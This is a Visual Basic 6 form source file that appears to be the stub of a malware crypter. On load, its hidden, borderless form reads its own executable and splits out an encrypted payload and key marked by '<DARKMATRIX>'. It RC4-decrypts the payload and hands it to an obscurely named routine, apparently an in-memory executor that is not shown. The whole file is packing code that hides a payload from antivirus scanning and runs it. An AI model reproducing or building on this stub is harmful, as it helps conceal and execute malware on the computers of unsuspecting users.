VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'Kein
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const PH = "<DARKMATRIX>"


Private Sub Form_Load()
Dim File As String
Dim Key As String
Dim Data As String

Open ThisExe For Binary Access Read As #1
Data = Space(LOF(1))
Get #1, , Data
Close #1

File = Split(Data, PH)(1)
Key = Split(Data, PH)(2)

Käsewurst ThisExe, StrConv(RC4(File, Key), vbFromUnicode), ""

End
End Sub
